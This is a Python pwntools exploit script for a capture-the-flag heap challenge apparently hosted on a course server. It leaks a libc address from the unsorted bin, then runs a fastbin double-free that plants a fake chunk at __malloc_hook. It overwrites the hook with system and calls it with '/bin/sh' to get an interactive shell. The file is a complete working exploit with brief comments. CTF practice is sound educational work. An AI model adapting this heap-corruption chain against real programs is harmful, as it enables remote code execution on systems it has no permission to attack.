from pwn import *

context(arch='amd64', os='linux', log_level='debug')

libc = ELF('libc-2.23.so')
main_arena_off = 0x00007ffff7dd1b78 - 0x00007ffff7a0d000

#  r = remote('localhost', 1111)
r = remote('edu-ctf.csie.org', 10178)

def add(size, note):
    r.sendlineafter('> \n', '1')
    r.sendlineafter('Size: ', str(size))
    if note is int:
        note = str(note)
    r.sendlineafter('Note: ', note)

def show(idx):
    r.sendlineafter('> \n', '2')
    r.sendlineafter('Index: ', str(idx))
    r.recvuntil(':\n')

def delete(idx):
    r.sendlineafter('> \n', '3')
    r.sendlineafter('Index: ', str(idx))


# a single 0x100 chunk will be merged into top chunk after free-ed
# in which case the address cannot be leaked
# (we expect it to be in unsorted bin)
# so add some other chunks after it
add(0x100, 'leak') # size = 0x110
add(0x68, 'a') # size = 0x70
add(0x68, 'b')


# leak libc address
delete(0)
show(0)
libc_base = u64(r.recv(6) + b'\0\0') - main_arena_off
malloc_hook = libc_base + libc.sym.__malloc_hook
success('libc = ' + hex(libc_base))
success('malloc_hook = ' + hex(malloc_hook))


# fastbin attack
delete(1)
delete(2)
delete(1)
add(0x68, p64(malloc_hook - 0x10 - 3)) # retrieve a
add(0x68, 'b again')
add(0x68, 'a again')
add(0x68, b'aaa' + p64(libc_base + libc.sym.system)) # get a fake chunk at malloc hook !

r.sendlineafter('> \n', '1')
r.sendlineafter('Size: ', str(libc_base + next(libc.search(b'/bin/sh'))))

r.interactive()

